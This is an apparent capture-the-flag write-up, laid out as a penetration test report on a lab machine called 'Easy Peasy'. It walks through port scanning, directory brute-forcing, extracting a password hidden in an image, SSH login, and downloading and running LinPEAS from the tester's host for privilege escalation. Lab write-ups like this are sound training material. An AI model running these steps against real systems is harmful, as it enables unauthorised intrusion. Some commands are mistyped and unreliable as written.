# Penetration Test Report - [Easy Peasy]
- Date: 21-07-2025

## Target Information
**Machine Name**: kral4
**Ip Address**: 10.10.99.131
**Platform**: Linux
**Categorie**: CTF

## Tools Used
- Nmap
- gobuster
- Steghide
- LinPEAS

---

## Step 1 | Nmap
`nmap -sC -sT -p- -oN espscan.txt 10.10.99.131`

- **Findings:**
Port 80/tcp http
Port 6498/tcp
Port 65524/tcp

## Step 2 | Gobuster
`gobuster dir -u http://10.10.99.131/`

- **Findings:**
/hidden
/robots.txt
/index.html

Again
`gobuster dir -u http://10.10.99.131/hidden`

- **Findings:**
/whatever
/index.html

## Step 3 | Go To Found Address
**Adress:** http://10.10.99.131/n0th1ng3ls3m4tt3r
- Download to image.

## Step 4 | Steghide
`steghide -sh binarycodepixabay.jpg`

Output: "created secret.txt"

- Read The .txt File:

`cat secret.txt`

- Output: "(binary text: iconvertedmypasswordtobinary)"

## Step 4 | Connect To SSH
```bash
ssh boring@10.10.99.131 -p 6498
password: iconvertedmypasswordtobinary
```
**Output:** "boring@kral4-PC: _"

## Step 5 | Privilege Escalation With LinPEAS
- CTRL+SHIFT+T -> `service apache2 start`
- ```bash
  boring@kral4-PC: wget <your IP>/linux/linpeas.sh
  boring@kral4-PC: ch mod +x linpeas.sh
  boring@kral4-PC: ./linpeas.sh
  ```
  - **Output:** 7 kernel vulnerabilities were detected

